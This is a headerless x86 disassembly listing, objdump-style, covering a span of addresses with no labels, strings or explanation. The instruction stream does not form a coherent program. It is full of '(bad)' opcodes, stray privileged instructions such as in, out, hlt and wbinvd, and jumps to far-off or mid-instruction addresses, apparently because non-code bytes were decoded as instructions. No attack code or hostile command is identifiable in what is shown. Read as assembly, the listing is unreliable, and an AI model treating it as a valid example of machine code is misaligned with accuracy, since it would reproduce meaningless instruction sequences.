  4111e1:	xor    eax,0x5f60014
  4111e6:	mov    ecx,DWORD PTR [esp+ebp*1-0x18]
  4111ea:	mov    dl,BYTE PTR [esp+ebp*1-0x1c]
  4111ee:	mov    BYTE PTR [eax+eax*1+0x0],cl
  4111f2:	sub    al,0xe0
  4111f4:	mov    BYTE PTR [esp+edi*8-0x17],dl
  4111f8:	mov    al,BYTE PTR [esp+ebp*8+0x5]
  4111fc:	push   edi
  4111fd:	push   ebp
  4111fe:	cwde   
  4111ff:	nop
  411200:	retf   
  411201:	call   0x3f401f
  411206:	inc    ebx
  411207:	int3   
  411208:	and    DWORD PTR [eax],edi
  41120a:	lahf   
  41120b:	(bad)  
  41120c:	mov    cl,dh
  41120e:	push   ebx
  41120f:	xor    ch,ah
  411211:	mov    ds:0x3bfe1cb9,eax
  411216:	(bad)  [edx-0xbb374c9]
  41121c:	xor    eax,0x1e10e3b
  411221:	add    BYTE PTR [eax-0x497cf76e],cl
  411227:	in     eax,dx
  411228:	add    DWORD PTR [eax],eax
  41122a:	cwde   
  41122b:	adc    eax,0x15851874
  411230:	add    eax,DWORD PTR [eax]
  411232:	mov    BYTE PTR [ecx+0x17978304],ch
  411238:	je     0x411253
  41123a:	test   DWORD PTR ds:0xa948007b,edx
  411240:	add    al,0x83
  411242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411243:	sbb    BYTE PTR [ebp+ecx*1+0x2f],dh
  411247:	enter  0xce8a,0xa0
  41124b:	xor    al,dh
  41124d:	inc    edi
  41124f:	out    0xfe,eax
  411251:	jmp    0x4112bb
  411253:	nop
  411254:	imul   esp,DWORD PTR [eax+eax*1],0xfe022800
  41125b:	call   FWORD PTR [eax]
  41125d:	adc    eax,0x1631d389
  411262:	das    
  411263:	push   ecx
  411264:	jl     0x4112dc
  411266:	inc    edi
  411267:	out    0xf6,eax
  411269:	push   0x6e6cfe18
  41126e:	sub    BYTE PTR [eax],al
  411270:	test   BYTE PTR [eax-0x76],bl
  411273:	imul   ecx,DWORD PTR [ebp-0x25],0xffffff8c
  411277:	inc    ebx
  411278:	adc    eax,0xb847c4bf
  41127d:	mov    esi,0x431a57dd
  411282:	or     BYTE PTR [edx-0x1e7dd62],al
  411288:	mov    ah,0x19
  41128a:	or     BYTE PTR [ebp+eiz*4-0x4dfffe16],al
  411291:	or     DWORD PTR [eax],eax
  411293:	imul   ebp,DWORD PTR [ebp+0x1]
  411297:	add    BYTE PTR [ecx],dh
  411299:	xchg   al,cl
  41129b:	and    eax,DWORD PTR [ecx+0x4a]
  41129e:	mov    edx,eax
  4112a0:	dec    edx
  4112a1:	mov    dl,0xb4
  4112a3:	push   eax
  4112a4:	stos   BYTE PTR es:[edi],al
  4112a5:	mov    al,ds:0xd99f2e2c
  4112aa:	adc    eax,0xdc16dd8a
  4112af:	push   esi
  4112b0:	jecxz  0x411327
  4112b2:	inc    esi
  4112b3:	mov    cl,BYTE PTR [ecx+0x6ef103d2]
  4112b9:	mov    ecx,0xc4d9
  4112be:	out    0x37,al
  4112c0:	mov    DWORD PTR [ebx+0x15],eax
  4112c3:	jecxz  0x41129f
  4112c5:	test   DWORD PTR ds:0xc40001f7,ecx
  4112cb:	add    eax,DWORD PTR [ebx+0x1f719bd]
  4112d1:	add    BYTE PTR [ecx],dh
  4112d3:	(bad)  
  4112d4:	stc    
  4112d5:	cmp    al,0x31
  4112d7:	clc    
  4112d8:	add    DWORD PTR [eax],eax
  4112da:	lods   eax,DWORD PTR ds:[esi]
  4112db:	adc    al,0xec
  4112dd:	and    BYTE PTR [edi],0x13
  4112e0:	rcr    edi,cl
  4112e2:	pop    ebp
  4112e3:	adc    al,0xd4
  4112e5:	add    esi,DWORD PTR [ecx]
  4112e7:	and    ah,0x82
  4112ea:	unpcklps xmm7,XMMWORD PTR [ebx+0x72645ffb]
  4112f1:	inc    esi
  4112f2:	push   ss
  4112f3:	dec    esi
  4112f4:	cmp    BYTE PTR [edi],dl
  4112f6:	imul   ebx
  4112f8:	cmc    
  4112f9:	mov    eax,0x4c6a5f8b
  4112fe:	out    0x5e,eax
  411300:	push   0x40
  411302:	es shr bh,cl
  411305:	add    ebp,DWORD PTR [edx-0x440c3c90]
  41130b:	rcl    edx,cl
  41130d:	ds jbe 0x411379
  411310:	jb     0x411358
  411312:	(bad)  
  411313:	pop    ds
  411314:	add    eax,0x6a59b717
  411319:	daa    
  41131a:	xor    DWORD PTR [ecx-0x74c9d52c],ecx
  411320:	xor    esp,eax
  411322:	add    BYTE PTR [eax],al
  411324:	cs xchg ecx,eax
  411326:	and    dl,BYTE PTR [edi]
  411328:	add    DWORD PTR [edx+0x62],esp
  41132b:	inc    ebp
  41132c:	xchg   esi,eax
  41132d:	pop    ss
  41132e:	aad    0x16
  411330:	xchg   DWORD PTR [ebx-0x3f1d1fc5],ecx
  411336:	call   0xf255443e
  41133b:	ss jecxz 0x411372
  41133e:	je     0x4113ba
  411340:	jmp    di
  411343:	add    ebp,DWORD PTR [edx+0x56fffb96]
  411349:	(bad)  
  41134a:	cmp    dh,BYTE PTR [ebx+edi*4+0x55208fce]
  411351:	(bad)  
  411352:	jle    0x411358
  411354:	vpcomuw xmm14,xmm7,XMMWORD PTR [edx],0x14
  41135a:	add    DWORD PTR [ebx+ecx*1-0x4cb38d22],ecx
  411361:	leave  
  411362:	std    
  411363:	call   0xe9452f0c
  411368:	xor    dl,BYTE PTR [ecx+0x1ba1e049]
  41136e:	mov    DWORD PTR [edi+0x2],ebp
  411371:	adc    eax,DWORD PTR [eax]
  411373:	jmp    0xed59ac25
  411378:	xor    dl,BYTE PTR [eax+eax*2]
  41137b:	pusha  
  41137c:	mov    ah,0x1a
  41137e:	add    al,0xe9
  411380:	xor    cl,BYTE PTR [ebp-0x121067a]
  411386:	std    
  411387:	bound  eax,QWORD PTR [eax]
  411389:	add    BYTE PTR [edi+eiz*1+0x4],dl
  41138d:	jmp    0xeb519dc4
  411392:	add    BYTE PTR [ecx],al
  411394:	ret    
  411395:	jno    0x411359
  411397:	adc    ebx,DWORD PTR [esi-0x201492b]
  41139d:	je     0x41134c
  41139f:	mov    DWORD PTR [esi-0x2015907],eax
  4113a5:	jo     0x4113c6
  4113a7:	daa    
  4113a8:	add    al,0xe9
  4113aa:	xor    dl,BYTE PTR [edi+eax*4+0x5f]
  4113ae:	mov    DWORD PTR [edx],edx
  4113b0:	add    cl,ch
  4113b2:	mov    ebx,0x32e51098
  4113b7:	adc    al,0x89
  4113b9:	outs   dx,DWORD PTR ds:[esi]
  4113ba:	jne    0x4113ce
  4113bc:	add    cl,ch
  4113be:	mov    eax,0x3fbb020e
  4113c3:	aad    0x88
  4113c5:	stc    
  4113c6:	xor    ebx,DWORD PTR [esi+0x1432ed1c]
  4113cc:	jae    0x4113be
  4113ce:	mov    ecx,0x54001098
  4113d3:	adc    al,BYTE PTR [eax]
  4113d5:	mov    esi,edx
  4113d7:	inc    DWORD PTR [ecx]
  4113d9:	add    BYTE PTR [eax-0x2e],cl
  4113dc:	mov    BYTE PTR [esi-0x20204],cl
  4113e2:	mov    eax,ds:0x8040d7e
  4113e7:	adc    cl,BYTE PTR [ecx-0x201df7a]
  4113ed:	inc    DWORD PTR [eax]
  4113ef:	add    BYTE PTR [eax-0x8],cl
  4113f2:	mov    al,BYTE PTR [esi-0x20218]
  4113f8:	push   esi
  4113f9:	sbb    BYTE PTR [eax],al
  4113fb:	mov    ecx,DWORD PTR [esi-0x27fffe04]
  411401:	mov    WORD PTR [ebx+0x11d418],es
  411407:	add    DWORD PTR [esi+0x8],ebp
  41140a:	add    al,BYTE PTR [eax]
  41140c:	enter  0xccec,0xd2
  411410:	clc    
  411411:	mov    WORD PTR [ecx+0x24],es
  411414:	mov    WORD PTR [esi-0x43],?
  411417:	je     0x411492
  411419:	mov    WORD PTR [ecx+0x24],cs
  41141c:	test   al,0x8c
  41141e:	xchg   ebx,eax
  41141f:	adc    BYTE PTR [ecx+edx*1-0xb9bd500],dl
  411426:	dec    ebp
  411427:	push   ecx
  411428:	and    edx,DWORD PTR [edi+0x11880411]
  41142e:	sub    DWORD PTR [esp+esi*1-0x38],ecx
  411432:	dec    edi
  411433:	push   ecx
  411434:	daa    
  411435:	daa    
  411436:	int    0x83
  411438:	aam    0x1
  41143a:	test   eax,eax
  41143c:	xor    eax,0x9b8b5b0c
  411441:	mov    esp,0x3cdb5e5e
  411446:	xor    eax,0x891830c2
  41144b:	xchg   BYTE PTR [ecx],dh
  41144d:	sti    
  41144e:	std    
  41144f:	dec    DWORD PTR [esi-0x2e]
  411452:	mov    ebp,0xe1000023
  411457:	aaa    
  411458:	mov    bh,0x5e
  41145a:	fild   QWORD PTR [ecx+0x3d]
  41145d:	aaa    
  41145e:	jae    0x411443
  411460:	add    DWORD PTR [eax+0x7eb31],edi
  411466:	repnz cmp DWORD PTR [ebp+0x49823523],0x86ea08c0
  411471:	inc    ebx
  411472:	cmp    DWORD PTR [ebx+0xf6d8a40],ebp
  411478:	or     BYTE PTR [ecx+0xf0d],al
  41147e:	xor    DWORD PTR [eax+0x41],esi
  411481:	je     0x4114b9
  411483:	ins    BYTE PTR es:[edi],dx
  411484:	cmp    eax,0x1eb2d2b
  411489:	ret    
  41148a:	stos   BYTE PTR es:[edi],al
  41148b:	outs   dx,BYTE PTR ds:[esi]
  41148c:	fld    QWORD PTR [ebx+0x2d]
  41148f:	jmp    0x411492
  411491:	mov    esp,DWORD PTR [ebp+0x3103c1d6]
  411497:	jmp    0x41144b
  411499:	mov    ch,BYTE PTR [ebp+0x3103c1d6]
  41149f:	jmp    0x411450
  4114a1:	mov    al,ch
  4114a3:	(bad)  
  4114a4:	aad    0x3
  4114a6:	xor    ebx,ebp
  4114a8:	mov    ah,0x4f
  4114aa:	stos   BYTE PTR es:[edi],al
  4114ab:	jbe    0x411495
  4114ad:	aas    
  4114ae:	sub    eax,0xe15201eb
  4114b3:	pop    edi
  4114b4:	shl    BYTE PTR [ebx],0x29
  4114b7:	jecxz  0x41146d
  4114b9:	hlt    
  4114ba:	add    BYTE PTR [eax],al
  4114bc:	jle    0x41147b
  4114be:	add    ebx,0x45
  4114c1:	out    dx,eax
  4114c2:	add    DWORD PTR [eax],eax
  4114c4:	jb     0x411464
  4114c6:	inc    eax
  4114c7:	retf   
  4114c8:	jne    0x4114dd
  4114ca:	mov    bl,0x40
  4114cc:	push   0xffffffcf
  4114ce:	stos   DWORD PTR es:[edi],eax
  4114cf:	inc    eax
  4114d0:	push   0xffffffcf
  4114d2:	cmp    al,0x7d
  4114d4:	push   ebp
  4114d5:	xchg   edx,eax
  4114d6:	jnp    0x4114ec
  4114d8:	inc    esi
  4114d9:	cld    
  4114da:	out    0xb6,eax
  4114dc:	in     al,0x64
  4114de:	jb     0x411499
  4114e0:	cs inc ebx
  4114e2:	xchg   edx,eax
  4114e3:	add    esp,edi
  4114e5:	(bad)  
  4114e6:	aaa    
  4114e7:	ret    0x1471
  4114ea:	jo     0x411500
  4114ec:	icebp  
  4114ed:	cld    
  4114ee:	jmp    0x17c:0xf710df02
  4114f5:	cwde   
  4114f6:	dec    eax
  4114f7:	or     esi,DWORD PTR [esi]
  4114f9:	ret    
  4114fa:	jae    0x4114f9
  4114fc:	ds dec edx
  4114fe:	test   al,0x3
  411500:	lods   al,BYTE PTR ds:[esi]
  411501:	int3   
  411502:	out    0x78,al
  411504:	add    DWORD PTR [esi*2+0x450ae45],ecx
  41150b:	cmp    al,0x73
  41150d:	xchg   edi,eax
  41150e:	and    cl,ah
  411510:	pop    edx
  411511:	in     eax,0xd8
  411513:	xor    eax,0xff8c9754
  411518:	xor    DWORD PTR [ecx+0x3ee7cf1],eax
  41151e:	and    BYTE PTR [ecx+0x146a0000],al
  411524:	aad    0x1e
  411526:	xor    ecx,DWORD PTR [ecx+0x7db5f5db]
  41152c:	call   0xf7fae7b7
  411531:	adc    dl,BYTE PTR [edi-0x2d791805]
  411537:	mov    edi,esi
  411539:	adc    al,BYTE PTR [edi+0x5bd4e7fb]
  41153f:	or     esi,DWORD PTR [ebp-0x7b]
  411542:	mov    cs,WORD PTR [edx+0x0]
  411545:	sub    BYTE PTR ds:0xafd13489,dh
  41154b:	stc    
  41154c:	sbb    al,0x24
  41154e:	pop    edi
  41154f:	lea    eax,[esp+edx*8+0x1a]
  411553:	xchg   ebx,eax
  411554:	inc    esp
  411555:	hlt    
  411556:	ret    0x8ed
  411559:	arpl   WORD PTR [esi+0x40],bp
  41155c:	lods   al,BYTE PTR ds:[esi]
  41155d:	jno    0x4115d5
  41155f:	sbb    BYTE PTR [eax+0x1cfeae2a],dl
  411565:	cmc    
  411566:	pop    ebp
  411567:	mov    esi,0x1432e91c
  41156c:	or     eax,0x4ef2b49f
  411571:	test   al,0x32
  411573:	mov    DWORD PTR [ecx+esi*8],esi
  411576:	mov    bh,0xf8
  411578:	cmp    ah,cl
  41157a:	add    al,0x8d
  41157c:	inc    esp
  41157d:	cld    
  41157e:	cmp    dl,BYTE PTR [ebx-0x117d23bc]
  411584:	or     BYTE PTR [ebx+0x0],ah
  411587:	add    dh,dh
  411589:	aas    
  41158a:	lods   al,BYTE PTR ds:[esi]
  41158b:	popa   
  41158c:	out    dx,al
  41158d:	pop    ss
  41158e:	nop
  41158f:	stos   BYTE PTR es:[edi],al
  411590:	mov    bh,0xfd
  411592:	cmp    BYTE PTR [ebp-0x1926bbfb],bl
  411598:	push   0xed9ff896
  41159d:	cli    
  41159e:	jge    0x411525
  4115a0:	sub    DWORD PTR [eax+eax*1+0x48f3075],esp
  4115a7:	push   esp
  4115a8:	loop   0x4115f2
  4115aa:	aas    
  4115ab:	jmp    0xf9ccac55
  4115b0:	inc    ecx
  4115b1:	cli    
  4115b2:	std    
  4115b3:	out    dx,al
  4115b4:	clc    
  4115b5:	xchg   ebp,eax
  4115b6:	adc    BYTE PTR [esi],ah
  4115b8:	jb     0x4115b4
  4115ba:	jge    0x411609
  4115bc:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4115be:	add    BYTE PTR [eax],al
  4115c0:	cmp    al,0x16
  4115c2:	mov    DWORD PTR [edx*8+0x58414bbf],eax
  4115c9:	std    
  4115ca:	cmp    DWORD PTR [ebp-0x1dc78],0x18fa910b
  4115d4:	xor    al,0x52
  4115d6:	aas    
  4115d7:	and    DWORD PTR [edx+0x628c0eff],0x23
  4115de:	(bad)  
  4115df:	inc    ebp
  4115e1:	xchg   edx,eax
  4115e2:	or     eax,0x4d24b7ff
  4115e7:	call   0x412bfd
  4115ec:	add    BYTE PTR [eax],al
  4115ee:	aaa    
  4115ef:	(bad)  
  4115f0:	pop    edx
  4115f1:	mov    DWORD PTR [ecx+ebp*4-0x3cf7f741],eax
  4115f8:	mov    ch,ah
  4115fa:	cdq    
  4115fb:	xor    al,0x7d
  4115fd:	add    BYTE PTR [eax],bl
  4115ff:	push   ss
  411600:	push   ecx
  411601:	push   esi
  411602:	lahf   
  411603:	js     0x411649
  411605:	or     BYTE PTR [ebp+0x8b97dc1],al
  41160b:	push   ss
  41160c:	add    BYTE PTR [eax],al
  41160e:	push   ecx
  41160f:	dec    edi
  411610:	add    al,0xcc
  411613:	js     0x411647
  411615:	sub    DWORD PTR [esi],0xd8fc0010
  41161b:	push   esi
  41161c:	jecxz  0x411624
  41161e:	push   ebx
  41161f:	mov    DWORD PTR [eax+0x1308e7],0x72b0900
  411629:	or     DWORD PTR [esi+0x2f813578],esp
  41162f:	adc    BYTE PTR [eax],al
  411631:	cld    
  411632:	mov    BYTE PTR [esi-0x12],dl
  411635:	or     ah,BYTE PTR [ecx+0x31328823]
  41163b:	je     0x411674
  41163d:	xor    BYTE PTR [ebx-0x11],0x7c
  411641:	aaa    
  411642:	mov    al,0xca
  411644:	inc    ecx
  411645:	push   cs
  411646:	xor    ebx,ebp
  411648:	inc    edx
  411649:	out    dx,al
  41164a:	aaa    
  41164b:	test   bh,0x88
  41164e:	daa    
  41164f:	jbe    0x411625
  411651:	add    BYTE PTR [eax],0x0
  411654:	push   edi
  411655:	jmp    0x411668
  411657:	add    dh,BYTE PTR [ecx]
  411659:	lods   al,BYTE PTR ds:[esi]
  41165a:	daa    
  41165b:	or     edi,DWORD PTR [edx+0x6e28506]
  411661:	lods   al,BYTE PTR ds:[esi]
  411662:	and    al,0xf
  411664:	sub    BYTE PTR [ecx-0x714fe884],dh
  41166a:	add    eax,esi
  41166c:	xor    ch,bl
  41166e:	inc    edx
  41166f:	jmp    0x8463:0x882ff42d
  411676:	xor    al,0x82
  411678:	repz out dx,al
  41167a:	jl     0x4116ab
  41167c:	mov    dl,0x48
  41167e:	ror    BYTE PTR [edx],1
  411680:	inc    edx
  411681:	je     0x411657
  411683:	dec    eax
  411684:	mov    dl,0x2a
  411686:	add    eax,0x87bfe885
  41168b:	mov    WORD PTR [ebx+ebp*2-0x4f],?
  41168f:	out    0xe,eax
  411691:	jmp    0x411694
  411693:	add    BYTE PTR [esi-0x2f],bh
  411696:	lods   al,BYTE PTR ds:[esi]
  411697:	mov    ch,al
  411699:	mov    bh,0x43
  41169b:	add    esi,DWORD PTR [ecx]
  41169d:	jbe    0x411664
  41169f:	and    ebp,DWORD PTR ds:0x704b5965
  4116a5:	jmp    0x411723
  4116a7:	or     DWORD PTR [eax+0x35c18502],ebp
  4116ad:	outs   dx,BYTE PTR ds:[esi]
  4116ae:	inc    ecx
  4116af:	add    esi,DWORD PTR [eax-0xfb324fc]
  4116b5:	adc    esp,edi
  4116b7:	xchg   ecx,eax
  4116b8:	add    BYTE PTR [eax],al
  4116ba:	test   ch,dl
  4116bc:	jecxz  0x4116c1
  4116be:	mov    edx,0xcb080b4f
  4116c3:	stos   DWORD PTR es:[edi],eax
  4116c4:	sbb    eax,ebp
  4116c6:	jle    0x411655
  4116c8:	out    dx,eax
  4116c9:	jl     0x4116f3
  4116cb:	xchg   ebp,eax
  4116cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116cd:	or     BYTE PTR [edx+0x6884ebd5],dh
  4116d3:	sub    ebx,DWORD PTR [eax*8+0x4295825e]
  4116da:	xor    dl,BYTE PTR [esp+esi*1]
  4116dd:	jge    0x411734
  4116df:	arpl   WORD PTR [edi],si
  4116e1:	mov    bl,0xbb
  4116e3:	dec    esi
  4116e4:	fistp  QWORD PTR [edx-0x23]
  4116e7:	pop    es
  4116e8:	je     0x4116a3
  4116ea:	ds gs pop ss
  4116ed:	sbb    al,0x4f
  4116ef:	adc    al,0xe7
  4116f1:	add    ebx,DWORD PTR [ecx+0x1ec51bac]
  4116f7:	mov    DWORD PTR [ebx+ecx*1+0x430ec66],ebp
  4116fe:	xor    DWORD PTR [edx+edi*4],edx
  411701:	sub    BYTE PTR [ebp-0x4],0xb7
  411705:	sbb    ecx,DWORD PTR [esi+0x5a03e714]
  41170b:	lea    ecx,[ebx-0x4f]
  41170e:	lock or al,0xe7
  411711:	mov    dl,0xbb
  411713:	push   eax
  411714:	add    edi,esp
  411716:	stos   DWORD PTR es:[edi],eax
  411717:	pusha  
  411718:	retf   
  411719:	jmp    FWORD PTR [ecx+0xfea7d5]
  41171f:	add    BYTE PTR [ebp+ecx*1-0x72e1dad8],al
  411726:	loope  0x4117a4
  411728:	icebp  
  411729:	push   esp
  41172a:	not    BYTE PTR [ebp+0x29]
  41172d:	aad    0x8
  41172f:	hlt    
  411730:	cmp    ecx,DWORD PTR [edx]
  411732:	add    BYTE PTR [eax-0x55],ah
  411735:	mov    WORD PTR [edi+0x7c19fa9],?
  41173b:	test   al,0x4d
  41173d:	wbinvd 
  41173f:	repz or eax,0xb3b8870d
  411745:	aad    0x4
  411747:	pusha  
  411748:	repz ss or eax,0x170c8b7f
  41174f:	jo     0x411746
  411751:	ss or  eax,0xdfd4657f
  411757:	rcr    ebp,1
  411759:	or     al,0x87
  41175b:	test   al,0x72
  41175d:	push   es
  41175e:	mov    dh,0xf0
  411760:	cmc    
  411761:	repz adc dl,ah
  411764:	dec    eax
  411765:	mov    WORD PTR [edx],cs
  411767:	pusha  
  411768:	cmc    
  411769:	ss or  eax,0xdfd4353f
  41176f:	icebp  
  411770:	sub    ecx,DWORD PTR ds:0xd323f0d
  411776:	mov    edi,0xc25a1860
  41177b:	icebp  
  41177c:	xor    ah,BYTE PTR [ebx-0x77]
  41177f:	mov    ch,0x16
  411781:	jns    0xe41182c
  411787:	or     ecx,DWORD PTR [ecx+0x18ef75eb]
  41178d:	jno    0x4117bc
  41178f:	push   ebp
  411790:	mov    ebx,ebp
  411792:	jne    0x411783
  411794:	adc    BYTE PTR [ecx+0x2d],ah
  411797:	push   ebp
  411798:	mov    ebx,ebp
  41179a:	jne    0x41178b
  41179c:	or     BYTE PTR [ecx+0x2d],dh
  41179f:	push   ebp
  4117a0:	xchg   DWORD PTR [edx],esi
  4117a2:	cmc    
  4117a3:	mov    edx,eax
  4117a5:	push   0x70
  4117a7:	adc    ecx,DWORD PTR [ecx-0x76edc517]
  4117ad:	add    dl,cl
  4117af:	dec    edi
  4117b0:	in     eax,0x18
  4117b2:	and    BYTE PTR [eax],dl
  4117b4:	aas    
  4117b5:	mov    ebx,DWORD PTR [edx+0x1010e54f]
  4117bb:	adc    BYTE PTR [edi],bh
  4117bd:	mov    ecx,DWORD PTR [edx+0x8e551]
  4117c3:	adc    edi,DWORD PTR [edi]
  4117c5:	mov    ecx,DWORD PTR [edx-0x76773286]
  4117cb:	stos   DWORD PTR es:[edi],eax
  4117cc:	mov    edi,0x88bd8808
  4117d1:	in     eax,0xdb
  4117d3:	xor    ecx,DWORD PTR [ecx]
  4117d5:	push   ebx
  4117d6:	inc    esi
  4117d7:	ror    DWORD PTR [edx+0x547b7c45],0x8
  4117de:	jecxz  0x4117e1
  4117e0:	mov    ecx,DWORD PTR [ebp+0x40]
  4117e3:	jnp    0x41182d
  4117e5:	add    al,0xd1
  4117e7:	inc    esp
  4117e8:	shr    bl,0x0
  4117eb:	add    BYTE PTR [ecx+eiz*8-0x36],dl
  4117ef:	sub    DWORD PTR [ebx+0x1f0f0ef8],0xbe89d8e3
  4117f9:	push   ecx
  4117fa:	jecxz  0x411800
  4117fc:	fldenv [ebx]
  4117fe:	mov    dh,dl
  411800:	dec    ecx
  411801:	push   ss
  411802:	or     eax,0xf2795e31
  411807:	cmp    DWORD PTR [ebx+0x7],0xe30800fe
  41180e:	fmul   DWORD PTR [ecx+0x10e3514e]
  411814:	jmp    0x1a0fa03c
  411819:	push   ss
  41181a:	push   DWORD PTR [eax]
  41181c:	inc    esi
  41181d:	jns    0x411811
  41181f:	sub    DWORD PTR [ebx],0xeb3332e3
  411825:	loop   0x4117fe
  411827:	mov    DWORD PTR [ecx],esi
  411829:	cmp    eax,0xdc33e541
  41182e:	adc    cl,BYTE PTR [eax+0x71e2ce7]
  411834:	pusha  
  411835:	sbb    eax,0xab0f279
  41183a:	or     edi,edi
  41183c:	lahf   
  41183d:	jmp    0x411811
  41183f:	fldcw  WORD PTR [eax+0x39e542cd]
  411845:	sbb    al,0x3e
  411847:	mov    ah,bh
  411849:	fiadd  WORD PTR [edx]
  41184b:	imul   BYTE PTR [edx+0xc01048]
  411851:	add    BYTE PTR [esi+0x30e680ee],al
  411857:	test   BYTE PTR [edx],dl
  411859:	or     BYTE PTR [eax+0x74],ch
  41185c:	xor    esi,DWORD PTR [eax]
  41185e:	outs   dx,DWORD PTR ds:[esi]
  41185f:	je     0x411871
  411861:	adc    BYTE PTR [edx+0x61],0x57
  411865:	test   eax,0x3027dc9b
  41186a:	push   0xa811d570
  41186f:	mov    esi,0x6a16ee42
  411874:	and    al,0x0
  411876:	mov    eax,0xeef9fa78
  41187b:	daa    
  41187c:	or     al,0x7
  41187e:	xor    ebx,ebp
  411880:	add    DWORD PTR [ecx+0x1b232be7],ecx
  411886:	mov    eax,0x2dee4225
  41188b:	je     0x41189d
  41188d:	or     dl,bh
  41188f:	jae    0x4118d4
  411891:	xor    cl,0xe6
  411894:	rcr    BYTE PTR ds:0xe58014b8,1
  41189a:	es jb  0x411872
  41189d:	mov    ah,0x9
  41189f:	mov    al,ds:0x13a9ffc2
  4118a4:	inc    esi
  4118a5:	inc    edx
  4118a6:	fisttp WORD PTR ds:0x13ca2468
  4118ac:	out    0x3,eax
  4118ae:	sub    bh,BYTE PTR [ebp+0x1471b0bf]
  4118b4:	jo     0x4118e2
  4118b6:	add    BYTE PTR [eax],al
  4118b8:	jno    0x41189e
  4118ba:	in     eax,dx
  4118bb:	or     BYTE PTR [edi+0x3103e7f7],0x9
  4118c2:	fild   DWORD PTR ss:[ecx]
  4118c5:	push   ebx
  4118c6:	out    0x7c,eax
  4118c8:	outs   dx,DWORD PTR ds:[esi]
  4118c9:	ror    dh,cl
  4118cb:	repnz mov cl,0xec
  4118ce:	rol    DWORD PTR [ecx+esi*1],cl
  4118d1:	adc    al,0xe2
  4118d3:	push   edx
  4118d4:	dec    esi
  4118d5:	inc    ebp
  4118d6:	sub    BYTE PTR [eax+edi*4],al
  4118d9:	jle    0x41188e
  4118db:	jge    0x411949
  4118dd:	nop
  4118de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118df:	add    BYTE PTR [eax-0x56160538],ch
  4118e5:	aad    0x6a
  4118e7:	and    cl,BYTE PTR [edi]
  4118e9:	mov    ebx,edx
  4118eb:	push   eax
  4118ec:	push   cs
  4118ed:	pop    esi
  4118ee:	sub    BYTE PTR [edx+ebp*1],al
  4118f1:	jg     0x411886
  4118f3:	jge    0x41194c
  4118f5:	rcl    BYTE PTR [esi+0x7bfbb002],cl
  4118fb:	add    al,0x31
  4118fd:	adc    al,0xe2
  4118ff:	push   edx
  411900:	push   esi
  411901:	dec    eax
  411902:	sub    BYTE PTR [eax+ebp*4],al
  411905:	shr    DWORD PTR [eax],cl
  411907:	sbb    edi,DWORD PTR [edx*4-0xbf9f7ba]
  41190e:	out    0xfe,eax
  411910:	(bad)  
  411911:	cmp    al,0xb9
  411913:	(bad)  
  411914:	neg    BYTE PTR [esi+eiz*1+0x680adf45]
  41191b:	and    eax,DWORD PTR [eax]
  41191d:	add    dl,ch
  41191f:	adc    al,0x0
  411921:	jmp    0x1f63858
  411926:	popf   
  411927:	push   esp
  411928:	add    al,bl
  41192a:	and    al,0x9c
  41192c:	(bad)  
  41192d:	sub    BYTE PTR [ebx],dl
  41192f:	ja     0x5438d73
  411935:	pusha  
  411936:	push   ds
  411937:	sbb    al,0xf9
  411939:	jo     0x41192e
  41193b:	xchg   ebp,eax
  41193c:	shl    ch,0x7f
  41193f:	adc    DWORD PTR [edi+0x3df9b617],eax
  411945:	bound  eax,QWORD PTR [ecx+0x743c28a8]
  41194b:	xrelease mov BYTE PTR [esi+0x680701ed],bh
  411952:	push   ebx
  411953:	out    dx,eax
  411954:	add    cl,ch
  411956:	xor    bl,BYTE PTR [edi]
  411958:	mov    ch,0x11
  41195a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41195b:	push   esp
  41195c:	add    BYTE PTR [eax+0x1b],dh
  41195f:	aam    0xed
  411961:	out    0xb5,eax
  411963:	cli    
  411964:	cld    
  411965:	jmp    0x5e4a2d9c
  41196a:	push   0x44
  41196c:	aas    
  41196d:	jmp    0x8700eb37
  411972:	inc    eax
  411973:	xchg   esp,eax
  411974:	in     eax,0x8d
  411976:	xor    dl,BYTE PTR [eax+eax*1]
  411979:	repnz cmp DWORD PTR [ebx],0x4d
  41197d:	sub    BYTE PTR ds:0x7d739d,ch
  411983:	add    BYTE PTR [ebp+0x16a981d9],bl
  411989:	pushf  
  41198a:	rcr    DWORD PTR [edx],1
  41198c:	sbb    ebx,DWORD PTR [esi+ebx*8-0x76cdaf96]
  411993:	sbb    eax,0xa8563b60
  411998:	xor    bl,BYTE PTR [edi]
  41199a:	jae    0x41199c
  41199c:	sub    al,0x70
  41199e:	faddp  st(1),st
  4119a0:	ja     0x4119b7
  4119a2:	jg     0x41198b
  4119a4:	and    al,0x17
  4119a6:	add    BYTE PTR [eax],al
  4119a8:	rol    DWORD PTR [ebp+0x25],cl
  4119ab:	push   esp
  4119ac:	cdq    
  4119ad:	push   ss
  4119ae:	xchg   edi,ebx
  4119b0:	sbb    DWORD PTR [esi],ecx
  4119b2:	or     eax,DWORD PTR [ecx-0x2e4d1]
  4119b8:	enter  0xb6f1,0x28
  4119bc:	retf   0xfdd7
  4119bf:	mov    BYTE PTR [edi+0x58],al
  4119c2:	out    dx,al
  4119c3:	push   ss
  4119c4:	or     DWORD PTR [esi],esi
  4119c6:	stc    
  4119c7:	add    BYTE PTR [eax+0x20b70916],cl
  4119cd:	test   al,0x40
  4119cf:	add    BYTE PTR [ecx],ch
  4119d1:	pop    es
  4119d2:	dec    BYTE PTR [ebp+0x60]
  4119d5:	cwde   
  4119d6:	jl     0x4119d0
  4119d8:	mov    bl,ch
  4119da:	test   BYTE PTR [ebx-0x7601e38a],ch
  4119e0:	mov    al,ds:0xd11fdd56
  4119e5:	sub    eax,0xeed0
  4119ea:	rcl    DWORD PTR [esi+0x8],1
  4119ed:	icebp  
  4119ee:	shl    DWORD PTR [edi],0x30
  4119f1:	enter  0x58c1,0x80
  4119f5:	jecxz  0x4119e9
  4119f7:	push   ecx
  4119f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119f9:	stos   BYTE PTR es:[edi],al
  4119fa:	pop    ecx
  4119fb:	inc    eax
  4119fc:	xor    cl,bl
  4119fe:	mov    eax,ds:0x7e0c028
  411a03:	outs   dx,DWORD PTR ds:[esi]
  411a04:	rcl    ecx,cl
  411a06:	mov    dh,0x6d
  411a08:	mov    edi,0xcd6d9a09
  411a0d:	shl    DWORD PTR [eax-0x10],0x30
  411a11:	enter  0x5781,0x80
